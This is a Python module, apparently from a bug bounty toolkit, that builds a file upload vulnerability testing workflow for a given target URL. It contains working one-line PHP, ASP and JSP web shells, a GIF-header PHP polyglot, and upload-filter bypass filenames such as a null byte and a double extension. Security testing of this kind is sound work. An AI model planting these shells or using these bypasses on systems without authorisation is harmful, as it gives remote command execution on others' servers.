"""File upload vulnerability testing workflow for bug bounty hunting."""

from typing import Any

from flask import request

from src.rest_api_server.logger import get_logger
from src.rest_api_server.utils.registry import workflow

logger = get_logger(__name__)


class FileUploadTestingFramework:
    """Specialized framework for file upload vulnerability testing."""

    def __init__(self):
        """Initialize file upload testing framework with malicious extensions."""
        self.malicious_extensions = [
            ".php",
            ".php3",
            ".php4",
            ".php5",
            ".phtml",
            ".pht",
            ".asp",
            ".aspx",
            ".jsp",
            ".jspx",
            ".py",
            ".rb",
            ".pl",
            ".cgi",
            ".sh",
            ".bat",
            ".cmd",
            ".exe",
        ]

        self.bypass_techniques = [
            "double_extension",
            "null_byte",
            "content_type_spoofing",
            "magic_bytes",
            "case_variation",
            "special_characters",
        ]

    def generate_test_files(self) -> dict[str, Any]:
        """Generate various test files for upload testing."""
        test_files = {
            "web_shells": [
                {
                    "name": "simple_php_shell.php",
                    "content": "<?php system($_GET['cmd']); ?>",
                },
                {"name": "asp_shell.asp", "content": '<%eval request("cmd")%>'},
                {
                    "name": "jsp_shell.jsp",
                    "content": (
                        '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
                    ),
                },
            ],
            "bypass_files": [
                {"name": "shell.php.txt", "technique": "double_extension"},
                {"name": "shell.php%00.txt", "technique": "null_byte"},
                {"name": "shell.PhP", "technique": "case_variation"},
                {"name": "shell.php.", "technique": "trailing_dot"},
            ],
            "polyglot_files": [
                {
                    "name": "polyglot.jpg",
                    "content": "GIF89a<?php system($_GET['cmd']); ?>",
                    "technique": "image_polyglot",
                }
            ],
        }

        return test_files

    def create_upload_testing_workflow(self, target_url: str) -> dict[str, Any]:
        """Create comprehensive file upload testing workflow."""
        workflow = {
            "target": target_url,
            "test_phases": [
                {
                    "name": "reconnaissance",
                    "description": "Identify upload endpoints",
                    "tools": ["katana", "gau", "paramspider"],
                    "expected_findings": ["upload_forms", "api_endpoints"],
                },
                {
                    "name": "baseline_testing",
                    "description": "Test legitimate file uploads",
                    "test_files": ["image.jpg", "document.pdf", "text.txt"],
                    "observations": [
                        "response_codes",
                        "file_locations",
                        "naming_conventions",
                    ],
                },
                {
                    "name": "malicious_upload_testing",
                    "description": "Test malicious file uploads",
                    "test_files": self.generate_test_files(),
                    "bypass_techniques": self.bypass_techniques,
                },
                {
                    "name": "post_upload_verification",
                    "description": "Verify uploaded files and test execution",
                    "actions": [
                        "file_access_test",
                        "execution_test",
                        "path_traversal_test",
                    ],
                },
            ],
            "estimated_time": 360,
            "risk_level": "high",
        }

        return workflow


FILEUPLOAD_FRAMEWORK = FileUploadTestingFramework()


@workflow()
def create_file_upload_testing_workflow():
    """Create file upload vulnerability testing workflow."""
    data = request.get_json()

    target_url = data["target_url"]

    logger.info(f"Creating file upload testing workflow for {target_url}")

    # Generate file upload testing workflow
    workflow = FILEUPLOAD_FRAMEWORK.create_upload_testing_workflow(target_url)

    # Generate test files
    test_files = FILEUPLOAD_FRAMEWORK.generate_test_files()
    workflow["test_files"] = test_files

    logger.info(f"File upload testing workflow created for {target_url}")

    return workflow
